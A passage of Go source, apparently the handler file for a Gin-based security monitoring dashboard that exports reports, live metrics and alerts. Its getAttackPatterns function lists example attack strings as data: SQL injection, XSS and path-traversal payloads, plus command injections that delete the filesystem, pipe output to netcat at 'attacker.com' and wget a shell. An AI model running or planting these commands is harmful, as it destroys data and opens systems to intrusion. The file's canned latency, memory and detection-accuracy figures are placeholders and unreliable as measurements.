	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
	}

	exportData := gin.H{
		"export_info": gin.H{
			"exported_at": time.Now().UTC(),
			"format":      format,
			"time_range":  timeRange,
			"version":     "1.0",
		},
		"summary": gin.H{
			"total_requests":        getRequestMetricValue(rateLimitMetrics, "TotalRequests"),
			"blocked_requests":      getMetricValue(securityMetrics, "RequestsBlocked"),
			"attacks_detected":      getMetricValue(securityMetrics, "AttacksDetected"),
			"security_health_score": sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics),
		},
		"detailed_data": gin.H{
			"security_metrics":   securityMetrics,
			"rate_limit_metrics": rateLimitMetrics,
			"threat_analysis":    sh.getActiveThreatsByType(),
			"recommendations":    sh.getSecurityRecommendations(sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics), securityMetrics),
		},
	}

	switch format {
	case "csv":
		c.Header("Content-Type", "text/csv")
		c.Header("Content-Disposition", "attachment; filename=security_report.csv")
		// Note: In a real implementation, you'd convert to CSV format
		c.JSON(http.StatusOK, gin.H{
			"success": true,
			"message": "CSV export would be generated here",
			"data":    exportData,
		})
	case "pdf":
		c.Header("Content-Type", "application/pdf")
		c.Header("Content-Disposition", "attachment; filename=security_report.pdf")
		// Note: In a real implementation, you'd generate PDF
		c.JSON(http.StatusOK, gin.H{
			"success": true,
			"message": "PDF export would be generated here",
			"data":    exportData,
		})
	default:
		c.Header("Content-Type", "application/json")
		c.Header("Content-Disposition", "attachment; filename=security_report.json")
		c.JSON(http.StatusOK, gin.H{
			"success": true,
			"export":  exportData,
		})
	}
}

// GetLiveSecurityData returns live security monitoring data
func (sh *SecurityHandler) GetLiveSecurityData(c *gin.Context) {
	// Get real-time security metrics
	var securityMetrics *middleware.SecurityMetrics
	var rateLimitMetrics *middleware.RequestMetrics

	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}
	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
	}

	liveData := gin.H{
		"timestamp": time.Now().UTC(),
		"status":    "live",
		"real_time_metrics": gin.H{
			"current_requests_per_second": sh.calculateCurrentRPS(rateLimitMetrics),
			"active_connections":          getRequestMetricValue(rateLimitMetrics, "UniqueVisitors"),
			"current_block_rate":          sh.calculateBlockRate(securityMetrics, rateLimitMetrics),
			"current_attack_rate":         sh.calculateAttackRate(securityMetrics, rateLimitMetrics),
		},
		"security_status": gin.H{
			"threat_level":   sh.getCurrentThreatLevel(securityMetrics),
			"active_threats": sh.getActiveThreatsByType(),
			"blocked_ips":    sh.getBlockedIPsCount(),
			"health_score":   sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics),
		},
		"recent_events": gin.H{
			"last_5_minutes": gin.H{
				"blocked_requests": getMetricValue(securityMetrics, "RequestsBlocked"),
				"attacks_detected": getMetricValue(securityMetrics, "AttacksDetected"),
				"new_violations":   getMetricValue(securityMetrics, "RateLimitViolations"),
			},
		},
		"system_performance": gin.H{
			"middleware_latency": "< 1ms", // This would be calculated from actual metrics
			"memory_usage":       sh.getSecurityMiddlewareMemoryUsage(),
			"cpu_impact":         "< 2%", // This would be calculated from actual metrics
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"data":    liveData,
	})
}

// GetSecurityAlerts returns current security alerts
func (sh *SecurityHandler) GetSecurityAlerts(c *gin.Context) {
	severity := c.DefaultQuery("severity", "all")
	limit := c.DefaultQuery("limit", "50")

	// Get current security metrics to generate alerts
	var securityMetrics *middleware.SecurityMetrics
	var rateLimitMetrics *middleware.RequestMetrics

	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}
	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
	}

	alerts := sh.generateSecurityAlerts(securityMetrics, rateLimitMetrics, severity)

	// Apply limit
	if limitInt, err := strconv.Atoi(limit); err == nil && limitInt < len(alerts) {
		alerts = alerts[:limitInt]
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"alerts": gin.H{
			"total_count":     len(alerts),
			"severity_filter": severity,
			"alerts":          alerts,
			"last_updated":    time.Now().UTC(),
		},
	})
}

// getActiveThreatsByType returns active threats categorized by type
func (sh *SecurityHandler) getActiveThreatsByType() map[string]int {
	// This would integrate with threat intelligence if available
	// For now, return basic categorization based on security metrics
	threats := map[string]int{
		"rate_limit_violations": 0,
		"ip_filter_violations":  0,
		"attack_attempts":       0,
		"suspicious_activity":   0,
	}

	if sh.advancedSecurity != nil {
		metrics := sh.advancedSecurity.GetSecurityMetrics()
		if metrics != nil {
			threats["rate_limit_violations"] = int(metrics.RateLimitViolations)
			threats["ip_filter_violations"] = int(metrics.IPFilterViolations)
			threats["attack_attempts"] = int(metrics.AttacksDetected)
			threats["suspicious_activity"] = int(metrics.SuspiciousRequests)
		}
	}

	return threats
}

// getBlockedIPsCount returns the number of currently blocked IP addresses
func (sh *SecurityHandler) getBlockedIPsCount() int {
	// This would integrate with IP blocking if available
	// For now, return a basic count based on rate limiter violations
	if sh.rateLimiter != nil {
		metrics := sh.rateLimiter.GetMetrics()
		if metrics != nil {
			// Estimate blocked IPs based on violations
			return int(metrics.ViolationsDetected)
		}
	}
	return 0
}

// Additional helper methods for security handlers

func getTotalIncidents(metrics *middleware.SecurityMetrics) int64 {
	if metrics == nil {
		return 0
	}
	return metrics.RequestsBlocked + metrics.AttacksDetected + metrics.SuspiciousRequests
}

func (sh *SecurityHandler) getKeyFindings(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) []string {
	findings := []string{}

	if securityMetrics != nil {
		if securityMetrics.AttacksDetected > 0 {
			findings = append(findings, fmt.Sprintf("%d attacks detected", securityMetrics.AttacksDetected))
		}
		if securityMetrics.RequestsBlocked > 0 {
			findings = append(findings, fmt.Sprintf("%d requests blocked", securityMetrics.RequestsBlocked))
		}
	}

	if len(findings) == 0 {
		findings = append(findings, "No significant security incidents detected")
	}

	return findings
}

func (sh *SecurityHandler) getThreatTrends() map[string]interface{} {
	return map[string]interface{}{
		"trend_direction": "stable",
		"change_percent":  0.0,
		"note":            "Historical trend analysis requires time-series data",
	}
}

func (sh *SecurityHandler) getGeographicAnalysis() map[string]interface{} {
	return map[string]interface{}{
		"top_countries":   []string{"Unknown"},
		"blocked_regions": []string{},
		"note":            "Geographic analysis requires IP geolocation data",
	}
}

func (sh *SecurityHandler) getAttackPatterns() gin.H {
	return gin.H{
		"sql_injection_patterns": []string{
			"' OR '1'='1",
			"UNION SELECT",
			"DROP TABLE",
			"; DELETE FROM",
		},
		"xss_patterns": []string{
			"<script>alert('XSS')</script>",
			"javascript:alert(1)",
			"<iframe src='javascript:alert(1)'>",
		},
		"path_traversal_patterns": []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\",
			"%2e%2e%2f",
		},
		"command_injection_patterns": []string{
			"; rm -rf /",
			"| nc attacker.com 4444",
			"&& wget malicious.com/shell",
		},
		"detection_accuracy": gin.H{
			"sql_injection":     0.95,
			"xss":               0.92,
			"path_traversal":    0.98,
			"command_injection": 0.88,
		},
	}
}

func (sh *SecurityHandler) getImmediateActions(metrics *middleware.SecurityMetrics) []string {
	actions := []string{}

	if metrics != nil && metrics.AttacksDetected > 10 {
		actions = append(actions, "Review and strengthen IP filtering rules")
	}
	if metrics != nil && metrics.RateLimitViolations > 50 {
		actions = append(actions, "Consider implementing stricter rate limits")
	}

	if len(actions) == 0 {
		actions = append(actions, "No immediate actions required")
	}

	return actions
}

func (sh *SecurityHandler) getPreventiveMeasures(metrics *middleware.SecurityMetrics) []string {
	return []string{
		"Regular security configuration review",
		"Monitor attack patterns and trends",
		"Update threat intelligence feeds",
		"Review and update rate limiting policies",
	}
}

func (sh *SecurityHandler) getConfigurationRecommendations(metrics *middleware.RequestMetrics) []string {
	recommendations := []string{}

	if metrics != nil && metrics.RequestsBlocked > metrics.RequestsAllowed/10 {
		recommendations = append(recommendations, "Consider adjusting rate limit thresholds")
	}

	if len(recommendations) == 0 {
		recommendations = append(recommendations, "Current configuration appears optimal")
	}

	return recommendations
}

func (sh *SecurityHandler) getDetailedEventAnalysis(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) map[string]interface{} {
	return map[string]interface{}{
		"event_summary": map[string]interface{}{
			"total_events": getTotalIncidents(securityMetrics),
			"event_types":  sh.getActiveThreatsByType(),
		},
		"analysis_note": "Detailed event analysis requires event logging and storage",
	}
}

func (sh *SecurityHandler) calculateCurrentRPS(metrics *middleware.RequestMetrics) float64 {
	if metrics == nil || metrics.TotalRequests == 0 {
		return 0.0
	}
	// Simplified calculation - in reality this would use time-windowed data
	return float64(metrics.TotalRequests) / 3600.0 // requests per second over 1 hour
}

func (sh *SecurityHandler) getCurrentThreatLevel(metrics *middleware.SecurityMetrics) string {
	if metrics == nil {
		return "unknown"
	}

	if metrics.AttacksDetected > 20 {
		return "high"
	} else if metrics.AttacksDetected > 5 {
		return "medium"
	} else if metrics.SuspiciousRequests > 10 {
		return "low"
	}

	return "minimal"
}

func (sh *SecurityHandler) getSecurityMiddlewareMemoryUsage() string {
	// In a real implementation, this would query actual memory usage
	return "< 50MB"
}

func (sh *SecurityHandler) generateSecurityAlerts(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics, severity string) []map[string]interface{} {
	alerts := []map[string]interface{}{}

	if securityMetrics != nil {
		if securityMetrics.AttacksDetected > 10 {
			alerts = append(alerts, map[string]interface{}{
				"id":              "ATK_001",
				"severity":        "high",
				"type":            "attack_detection",
				"message":         fmt.Sprintf("High number of attacks detected: %d", securityMetrics.AttacksDetected),
				"timestamp":       time.Now().UTC(),
				"action_required": true,
			})
		}

		if securityMetrics.RateLimitViolations > 50 {
			alerts = append(alerts, map[string]interface{}{
				"id":              "RL_001",
				"severity":        "medium",
				"type":            "rate_limit",
				"message":         fmt.Sprintf("Excessive rate limit violations: %d", securityMetrics.RateLimitViolations),
				"timestamp":       time.Now().UTC(),
				"action_required": false,
			})
		}
	}

	// Filter by severity if specified
	if severity != "all" {
		filteredAlerts := []map[string]interface{}{}
		for _, alert := range alerts {
			if alert["severity"] == severity {
				filteredAlerts = append(filteredAlerts, alert)
			}
		}
		alerts = filteredAlerts
	}

	return alerts
}
